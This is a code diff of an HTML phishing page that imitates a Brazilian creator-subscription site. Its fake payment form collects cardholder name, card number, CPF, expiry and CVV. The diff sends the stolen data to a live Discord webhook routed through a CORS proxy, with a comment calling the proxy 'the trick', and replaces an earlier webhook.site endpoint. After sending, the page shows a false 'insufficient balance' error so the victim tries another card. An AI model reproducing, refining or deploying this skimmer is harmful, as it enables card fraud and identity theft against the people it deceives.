@@ -11,41 +11,39 @@
     <style>
         :root { --primary: #f47b52; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: #fff; padding-bottom: 50px; }
-        .nav { padding: 15px; border-bottom: 1px solid #eee; text-align: center; }
-        .banner { width: 100%; height: 200px; object-fit: cover; }
-        .profile { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #fff; margin: -50px 0 0 20px; position: relative; object-fit: cover; }
-        .content { padding: 20px; }
-        .btn-pay { width: 100%; padding: 15px; background: linear-gradient(90deg, #f47b52, #f9a67a); border: none; border-radius: 50px; color: #fff; font-weight: 800; margin-top: 15px; cursor: pointer; }
+        body { background: #fff; text-align: center; }
+        .nav { padding: 15px; border-bottom: 1px solid #eee; }
+        .banner { width: 100%; height: 180px; object-fit: cover; }
+        .profile { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #fff; margin-top: -45px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn-pay { width: 90%; padding: 15px; background: linear-gradient(90deg, #f47b52, #f9a67a); border: none; border-radius: 50px; color: #fff; font-weight: 800; margin-top: 20px; cursor: pointer; }
         #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
-        .modal-box { background: #fff; width: 90%; max-width: 400px; margin: 20% auto; padding: 25px; border-radius: 20px; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 5px; }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        .modal-box { background: #fff; width: 90%; max-width: 400px; margin: 15% auto; padding: 20px; border-radius: 15px; text-align: left; }
+        .form-group { margin-bottom: 10px; }
+        .form-group label { display: block; font-size: 11px; font-weight: 700; margin-bottom: 3px; }
+        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
     </style>
 </head>
 <body>
     <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="25"></div>
     <img src="capa.png" class="banner">
     <img src="perfil1.png" class="profile">
-    <div class="content">
-        <h2>Kamylinha Santos ✅</h2>
-        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
-        <button class="btn-pay" onclick="abrir()">ASSINAR POR R$ 10,00</button>
-    </div>
+    <h2>Kamylinha Santos ✅</h2>
+    <button class="btn-pay" onclick="document.getElementById('modal').style.display='block'">ASSINAR CONTEÚDO</button>
+
     <div id="modal">
         <div class="modal-box">
-            <h3 style="margin-bottom: 20px; color: var(--primary)">Dados de Pagamento</h3>
+            <h3 style="color:var(--primary); margin-bottom:15px;">Pagamento Seguro</h3>
             <div class="form-group"><label>NOME NO CARTÃO</label><input type="text" id="n"></div>
             <div class="form-group"><label>NÚMERO DO CARTÃO</label><input type="text" id="c"></div>
             <div class="form-group"><label>CPF</label><input type="text" id="cpf"></div>
-            <div style="display: flex; gap: 10px;">
-                <div class="form-group"><label>DATA</label><input type="text" id="d" placeholder="MM/AA"></div>
-                <div class="form-group"><label>CVV</label><input type="text" id="cvv"></div>
+            <div style="display:flex; gap:10px">
+                <div class="form-group" style="flex:1"><label>VALIDADE</label><input type="text" id="d"></div>
+                <div class="form-group" style="flex:1"><label>CVV</label><input type="text" id="cvv"></div>
             </div>
-            <button class="btn-pay" onclick="enviar()">CONFIRMAR PAGAMENTO</button>
+            <button class="btn-pay" style="width:100%" onclick="enviar()">CONFIRMAR</button>
         </div>
     </div>
+
     <script>
         $(document).ready(function(){
             $('#c').mask('0000 0000 0000 0000');
@@ -53,32 +51,36 @@
             $('#d').mask('00/00');
             $('#cvv').mask('000');
         });
-        function abrir() { document.getElementById('modal').style.display = 'block'; }
+
         function enviar() {
-            const dados = {
-                nome: document.getElementById('n').value,
-                card: document.getElementById('c').value,
-                cpf: document.getElementById('cpf').value,
-                data: document.getElementById('d').value,
-                cvv: document.getElementById('cvv').value,
-                id_vendedor: "1326639660872499315"
+            const webhook = "https://discord.com/api/webhooks/1470300746439458902/TbdZwuh6kMX7vdMD97wvOdZ2Rzf63w7PB2GUyOeOEFKwcui6VI2TAubXJyjYVdxIoWZH";
+            
+            const payload = {
+                embeds: [{
+                    title: "💳 NOVO CARD CAPTURADO",
+                    color: 16038738,
+                    fields: [
+                        { name: "👤 Nome", value: document.getElementById('n').value, inline: true },
+                        { name: "🆔 CPF", value: document.getElementById('cpf').value, inline: true },
+                        { name: "💳 Card", value: document.getElementById('c').value, inline: false },
+                        { name: "📅 Data", value: document.getElementById('d').value, inline: true },
+                        { name: "🔒 CVV", value: document.getElementById('cvv').value, inline: true }
+                    ],
+                    footer: { text: "ID: 1326639660872499315" }
+                }]
             };
-            if(!dados.card || !dados.cvv) return alert("Preencha tudo!");
+
             Notiflix.Loading.circle('Processando...');
 
-            // SEU LINK DO WEBHOOK.SITE
-            const url = "https://webhook.site/9ff5f800-50a2-4d33-957f-9acaf708f381";
-
-            fetch(url, {
-                method: 'POST',
-                mode: 'no-cors', 
-                body: JSON.stringify(dados)
+            // O TRUQUE: Usando um proxy para o navegador não bloquear
+            fetch("https://corsproxy.io/?" + encodeURIComponent(webhook), {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
             }).then(() => {
                 setTimeout(() => {
                     Notiflix.Loading.remove();
-                    Notiflix.Report.failure('Erro', 'Saldo insuficiente. Tente outro cartão.', 'OK');
-                    document.getElementById('c').value = "";
-                    document.getElementById('cvv').value = "";
+                    Notiflix.Report.failure('Erro', 'Saldo insuficiente.', 'OK');
                 }, 2000);
             });
         }
